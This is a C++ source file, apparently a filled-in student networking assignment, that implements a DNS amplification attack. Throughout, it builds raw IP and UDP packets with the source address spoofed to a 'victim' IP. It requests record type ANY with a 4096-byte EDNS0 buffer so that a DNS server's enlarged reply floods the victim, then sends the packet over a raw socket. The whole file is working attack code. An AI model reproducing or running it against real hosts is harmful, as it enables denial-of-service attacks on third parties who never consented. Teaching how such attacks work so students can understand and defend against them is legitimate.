#include "dns_attack.h"

#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>

#include <cstring>
#include <iostream>
#include <span>
#include <string>
#include <vector>

int createDnsOption(std::span<uint8_t> buffer) {
  auto &&opt = *reinterpret_cast<DnsOption *>(buffer.data());
  // TODO: Please fill in the following blanks
  // opt.name = ;
  // opt.type = ;
  // opt.udplen = ;
  // opt.rcode = ;
  // opt.edns_ver = ;
  // opt.Z = ;
  // opt.datalen = ;

  opt.name = 0;             //DNS option name , 0:no specific name is provided
  opt.type = htons(41);     //DNS type
                            //Amplificate : htons(41) EDNS0 extend the maximum size of udp packet
  opt.udplen = htons(4096);
  opt.rcode = 0;            //DNS response , 0 : no errors.
  opt.edns_ver = 0;         //Extension Mechanisms Version for DNS
  opt.Z = htons(0x0000);    //flag bits  opt.Z = htons(0x8000);
  opt.datalen = 0;          //the length of data , 0 : no addtional data included.

  
  return sizeof(DnsOption);
}

#define DOMAIN_NAME "4ieee3org" // dns special format
int createDnsQuery(std::span<uint8_t> buffer, const std::vector<uint8_t> &dnsRecord) {
  std::copy(dnsRecord.begin(), dnsRecord.end(), buffer.begin());

  auto queryBuffer = buffer.last(buffer.size() - dnsRecord.size());
  auto &&query = *reinterpret_cast<DnsQuery *>(queryBuffer.data());
  // TODO: Please fill in the following blanks
  // query.qclass = ;
  // query.qtype = ;

  query.qclass = htons(1);   //IN (0x0001) , 1 : internet
  query.qtype  = htons(255); //1 : A (Host Address)
                             //Amplificate : set to 255 : ANY

  // transform the domain name into special format, digit to hex
  // unsigned char transformed[] = DOMAIN_NAME;
  // for (int i = 0; i < strlen(DOMAIN_NAME); i++) {
  //     if (isdigit(transformed[i])) {
  //         transformed[i] = transformed[i] - 48;
  //     }
  // }
  // memcpy(query.dname, transformed, strlen(DOMAIN_NAME));

  auto nextBuffer = buffer.last(queryBuffer.size() - sizeof(DnsQuery));
  return createDnsOption(nextBuffer) + sizeof(DnsQuery) + dnsRecord.size();
}

int createDnsHeader(std::span<uint8_t> buffer, const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<DnsHeader *>(buffer.data());
  // TODO: Please fill in the following blanks
  // hdr.id = ;           // See project1 spec
  // hdr.flags = ;        // Flags
  // hdr.qcount = ;       // Questions
  // hdr.ans = ;          // Answer RRs
  // hdr.auth = ;         // Autority RRs
  // hdr.add = ;          // Additional RRs

  hdr.id = htons(0x03B6);           // Convert from Student Number
  hdr.flags = htons(0x0100);        // Flags
  hdr.qcount = htons(1);            // Questions
  hdr.ans = htons(0);               // Answer RRs
  hdr.auth = htons(0);              // Autority RRs
  hdr.add = htons(0);               // Additional RRs

  auto nextBuffer = buffer.last(buffer.size() - sizeof(DnsHeader));
  return createDnsQuery(nextBuffer, dnsRecord) + sizeof(DnsHeader);
}

int createUdpHeader(std::span<uint8_t> buffer, int targetPort,
                    const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<udphdr *>(buffer.data());
  // TODO: Please fill in the following blanks
  // hdr.source = ;
  // hdr.dest = ;

  hdr.source = htons(targetPort);//source port (Victim port)
  hdr.dest   = htons(53);        //target port

  auto nextBuffer = buffer.last(buffer.size() - sizeof(udphdr));
  int payloadLength = createDnsHeader(nextBuffer, dnsRecord) + sizeof(udphdr);

  // TODO: Please fill in the following blanks
  // hdr.len = ;
  // hdr.check = ;

  hdr.len = htons(payloadLength); //UDP packet total length (include header)
  hdr.check = 0;                  //checksum(packet, packetlen);
                                  //Checksum calculation is not mandatory in UDP communication
  return payloadLength;
}

int createIpHeader(std::span<uint8_t> buffer, const std::string &targetIp, int targetPort,
                   const std::string &dnsIp, const std::vector<uint8_t> &dnsRecord) {
  auto &&hdr = *reinterpret_cast<iphdr *>(buffer.data());

  // TODO: Please fill in the following blanks
  // hdr.version = ;
  // hdr.ihl = ;
  // hdr.ttl = ;
  // hdr.protocol = ;
  // hdr.saddr = ;     // source IP address
  // hdr.daddr = ;     // destination IP address

  hdr.version = 4;    //IP version, typically set to 4 for IPv4
  hdr.ihl = 5;        //IP header length,usually set to 5(32 bit increments)
  hdr.ttl = 64;       //time to live
  hdr.protocol = IPPROTO_UDP;              //Protocol type, set to IPPROTO_UDP for UDP packets
  hdr.saddr = inet_addr(targetIp.c_str()); //Source IP address      (victim)
  hdr.daddr = inet_addr(dnsIp.c_str());    //Destination IP address (DNS server)


  hdr.id = htons(getpid());
  hdr.frag_off = 0x40;  // Don't fragment

  auto nextBuffer = buffer.last(buffer.size() - sizeof(iphdr));
  int payloadLength = createUdpHeader(nextBuffer, targetPort, dnsRecord) + sizeof(iphdr);

  // TODO: Please fill in the following blanks
  // hdr.tot_len = ;
  // hdr.check = ;

  hdr.tot_len = payloadLength;
  hdr.check = 0;

  return payloadLength;
}

void attack(const std::string &targetIp, int targetPort, const std::string &dnsIp,
            char *dnsRecord) {
  // Make dns query
  std::vector<uint8_t> queryRecord;
  queryRecord.reserve(32);

  char *token = strtok(dnsRecord, ".");
  while (token != nullptr) {
    int len = strlen(token);
    queryRecord.emplace_back(len);
    queryRecord.insert(queryRecord.end(), token, token + len);
    token = strtok(nullptr, ".");
    //printf("Token: %s\n", token);
  }
  queryRecord.emplace_back(0);


  std::vector<uint8_t> packetBuffer(1024);
  int packetLength = createIpHeader(packetBuffer, targetIp, targetPort, dnsIp, queryRecord);
  // Send data
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  sockaddr_in addr{};
  addr.sin_family = AF_INET;
  addr.sin_port = htons(53);
  addr.sin_addr.s_addr = inet_addr(dnsIp.c_str());

  if (sock == -1) {
    std::cerr << "Could not create socket.\n";
  } else {
    sendto(sock, packetBuffer.data(), packetLength, 0, (sockaddr *)&addr, sizeof(addr));
    close(sock);
  }
}
